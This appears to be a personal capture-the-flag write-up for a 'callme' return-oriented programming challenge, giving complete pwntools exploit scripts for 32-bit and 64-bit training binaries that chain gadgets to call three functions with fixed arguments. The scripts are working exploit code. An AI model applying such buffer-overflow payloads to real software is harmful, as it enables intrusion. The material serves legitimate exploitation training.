# Solution
This challenge is using a basic ROP. A very similar example can be found in [[Low Level/Return-Oriented-Programming | here]].

The idea is very much the same for 32 bit and 64 bit. The only difference is the memory layout thus, making the payload position slightly differ. We only need 2 things:
1. Address of `callme_one(), callme_two(), callme_three()`, and
2. A gadget to place our parameters into the registers. The gadget is already inside the program (very convinient!). You can find it using [[Low Level/binary recon#^a6a216 | ropper]].

#### 32 bit
```bash
| padding | callme_one | gadget | param1-3 | callme_two | gadget | param1-3 | callme_three | gadget | param1-3 
```
```python
from pwn import *

gadget = p32(0x080487f9) # pop esi; pop edi; pop ebp; ret; 

callme_one = p32(0xf7fc063d)
callme_two = p32(0xf7fc0755)
callme_three = p32(0xf7fc0855)

arg1 = p32(0xdeadbeef)
arg2 = p32(0xcafebabe)
arg3 = p32(0xd00df00d)
full_arg = arg1 + arg2 + arg3

payload = b"A"*44 + callme_one + gadget + full_arg
payload += callme_two + gadget + full_arg
payload += callme_three + gadget + full_arg

p = process("./callme32")
p.recvuntil(b">")
p.send(payload)

print(p.recvall().decode())
```
#### 64 bit
```bash
| padding | gadget | param1-3 | callme_one | gadget | param1-3 | callme_two | gadget | param1-3
| callme_three | 
```
```python
from pwn import *

gadget = p64(0x000000000040093c) # pop rdi; pop rsi; pop rdx; ret;

callme_one = p64(0x7ffff7dc381a)
callme_two = p64(0x7ffff7dc392b)
callme_three = p64(0x7ffff7dc3a2d)

arg1 = p64(0xdeadbeefdeadbeef)
arg2 = p64(0xcafebabecafebabe)
arg3 = p64(0xd00df00dd00df00d)
full_arg = arg1 + arg2 + arg3

payload = b"A"*40 + gadget + full_arg + callme_one 
payload += gadget + full_arg + callme_two
payload += gadget + full_arg + callme_three

p = process("./callme")
p.recvuntil(b">")
p.send(payload)

print(p.recvall().decode())
```